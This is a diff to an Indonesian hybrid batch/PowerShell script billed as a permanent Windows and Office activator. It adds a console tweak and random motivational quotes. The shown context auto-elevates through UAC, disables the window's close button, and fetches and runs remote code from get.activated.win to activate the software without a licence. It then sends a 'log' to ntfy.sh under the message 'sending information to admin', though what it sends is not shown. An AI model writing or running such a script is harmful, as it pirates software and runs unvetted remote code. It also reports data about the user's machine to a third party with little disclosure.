@@ -1,7 +1,7 @@
 <# ::
 @echo off
 title // ACTIVATOR WINDOWS + OFFICE PERMANENT - INDOJAVA ONLINE - HINZDC X SARGA
-mode con cols=91 lines=32
+mode con cols=92 lines=32
 color 0B
 
 :Begin UAC check and Auto-Elevate Permissions
@@ -123,6 +123,23 @@ namespace CloseButtonToggle {
 Add-Type $code
 [CloseButtonToggle.Status]::Disable()
 
+function UnQuickEdit
+{
+	$t=[AppDomain]::CurrentDomain.DefineDynamicAssembly((Get-Random), 1).DefineDynamicModule((Get-Random), $False).DefineType((Get-Random))
+	$t.DefinePInvokeMethod('GetStdHandle', 'kernel32.dll', 22, 1, [IntPtr], @([Int32]), 1, 3).SetImplementationFlags(128)
+	$t.DefinePInvokeMethod('SetConsoleMode', 'kernel32.dll', 22, 1, [Boolean], @([IntPtr], [Int32]), 1, 3).SetImplementationFlags(128)
+	$t.DefinePInvokeMethod('GetConsoleWindow', 'kernel32.dll', 22, 1, [IntPtr], @(), 1, 3).SetImplementationFlags(128)
+	$t.DefinePInvokeMethod('SendMessageW', 'user32.dll', 22, 1, [IntPtr], @([IntPtr], [UInt32], [IntPtr], [IntPtr]), 1, 3).SetImplementationFlags(128)
+	$k=$t.CreateType()
+	if ($winbuild -GE 17763) {
+		if ($k::SendMessageW($k::GetConsoleWindow(), 127, 0, 0) -EQ [IntPtr]::Zero) {
+			return
+		}
+	}
+	$v=(0x0080, 0x00A0)[!($winbuild -GE 10586)]
+	$b=$k::SetConsoleMode($k::GetStdHandle(-10), $v)
+}
+UnQuickEdit
 #-----------------------------------------------------------------------------------------
 
 $Host.UI.RawUI.WindowTitle = '// ACTIVATOR WINDOWS + OFFICE PERMANENT // - INDOJAVA ONLINE - HINZDC X SARGA'
@@ -157,6 +174,64 @@ if ($response.StatusCode -eq 200) {
 $null = $label
 $null = $number
 $null = $times
+
+# Array berisi kata-kata mutiara
+$kataMutiara = @(
+    "Janganlah engkau mengucapkan perkataan yang engkau sendiri tak suka mendengarnya jika orang lain mengucapkannya kepadamu."
+    "Jangan gunakan ketajaman kata-katamu pada ibumu yang mengajarimu cara berbicara."
+    "Kemarahan dimulai dengan kegilaan dan berakhir dengan penyesalan."
+    "Kesalahan terburuk kita adalah ketertarikan kita pada kesalahan orang lain."
+    "Jangan melibatkan hatimu dalam kesedihan atas masa lalu atau kamu tidak akan siap untuk apa yang akan datang."
+    "Barangsiapa menyalakan api fitnah, maka dia sendiri yang akan menjadi bahan bakarnya."
+    "Jangan menjelaskan tentang dirimu kepada siapapun, karena yang menyukaimu tidak butuh itu. Dan yang membencimu tidak percaya itu."
+    "Balas dendam terbaik adalah menjadikan dirimu lebih baik."
+    "Hiduplah seakan-akan kamu akan mati besok. Belajarlah seakan-akan kamu akan hidup untuk selamanya."
+    "Cara untuk memulai adalah dengan berhenti berbicara dan mulai melakukan."
+    "Dalam hidup, kamu akan mendapatkan teman, tetapi hanya satu yang sejati di saat-saat terburukmu."
+    "Hal-hal baik membutuhkan waktu, jadi bersikaplah positif dan sabar."
+    "Berhenti bermimpi, mulailah bekerja dan kejar impianmu."
+    "Perubahan dimulai dari langkah kecil."
+    "Bahagia itu sederhana, bersyukur saja."
+    "Keajaiban terjadi saat kamu percaya."
+    "Jadilah versi terbaik dirimu."
+    "Kebahagiaan datang dari hati yang tenang."
+    "Fokus pada solusi, bukan masalah."
+    "Mulai dari sekarang, jangan menunda."
+    "Hidup itu naik turun, nikmati perjalanannya."
+    "Kunci kebahagiaan adalah bersyukur."
+    "Jangan bandingkan dirimu dengan orang lain."
+    "Jadilah cahaya dalam kegelapan."
+    "Percayalah pada prosesnya."
+    "Hidup hanya sekali, jadikan berarti."
+    "Cintai dirimu sebelum mencintai orang lain."
+    "Jangan berhenti mencoba, jangan pernah menyerah."
+    "Keberhasilan datang dari keyakinan pada diri sendiri."
+    "Kebahagiaan sejati datang dari dalam."
+    "Tidak ada jalan pintas menuju puncak."
+    "Jangan hanya berlari, melesatlah."
+    "Kemarin aku pintar, jadi aku ingin mengubah dunia. Hari ini aku bijak, jadi aku mengubah diriku sendiri."
+    "Hiduplah seolah-olah kamu akan mati besok. Belajarlah seolah-olah kamu akan hidup selamanya."
+    "Hidupmu dibentuk oleh pikiranmu. Apa yang kamu pikirkan, itulah dirimu."
+    "Tidak peduli seberapa lambat kamu berjalan selama kamu tidak berhenti."
+    "Jangan pernah menunda untuk besok apa yang bisa kamu lakukan hari ini."
+    "Kualitas hidupmu ditentukan oleh kualitas pertanyaan yang kamu ajukan."
+    "Sebaik-baik manusia adalah yang paling bermanfaat bagi orang lain."
+    "Orang kuat bukan yang pandai bergulat, tetapi yang mampu mengendalikan diri saat marah."
+    "Berbahagialah dengan apa yang Allah takdirkan, karena itu adalah pilihan terbaik untukmu."
+    "Barangsiapa yang memperbaiki hubungannya dengan Allah, maka Allah akan memperbaiki hubungannya dengan manusia."
+    "Ilmu itu seperti air, ia hanya mengalir ke tempat yang rendah hati."
+    "Jangan merasa takut dengan rezeki yang tertunda, karena apa yang telah ditetapkan bagimu tidak akan pernah luput darimu."
+    "Jangan lihat siapa yang berbicara, tetapi lihatlah apa yang dia bicarakan."
+    "Jika kamu menemukan kekurangan pada temanmu, tutupilah dengan nasihat, bukan cacian."
+    "Dunia ini hanyalah bayangan, kejar bayangan itu, dan ia akan lari darimu. Tapi berpalinglah dari bayangan itu, maka ia akan mengikutimu."
+    "Waktu adalah pedang; jika kamu tidak memanfaatkannya, maka ia akan memotongmu."
+    "Barang siapa mengenal dirinya, maka ia akan mengenal Tuhannya."
+    
+
+)
+
+# Mengambil satu kata mutiara secara acak
+$kataAcak = Get-Random -InputObject $kataMutiara
 
 function ntfy {
     # URL untuk ntfy.sh
@@ -321,9 +396,9 @@ function ntfy {
 
     # Tampilkan hasil pengiriman
     if ($response) {
-        Write-Output "Sending log.."
+        Write-Output
     } else {
-        Write-Output "failed sending log.."
+        Write-Output " failed sending log.." -ForegroundColor Red
     }
 }
 
@@ -333,8 +408,10 @@ Write-Host " + GETING SCRIPT.."
 Write-Host " + ACTIVATING.."
 & ([ScriptBlock]::Create((irm https://get.activated.win))) /HWID /Ohook | Out-Null
 Write-Host " >> PROSES AKTIVASI SELESAI.. SELAMAT MENGGUNAKAN.." -ForegroundColor Green
-Write-Host "     // JANGAN LUPA BAHAGIA. //" -ForegroundColor Red
 Write-Host
+Write-Host " // $kataAcak //" -ForegroundColor Red
+Write-Host
+Write-Host " >> MENGIRIM INFORMASI KE ADMIN.." -ForegroundColor Yellow
 ntfy
 Write-Host "----------------------------"
 $EndDTM = (Get-Date)
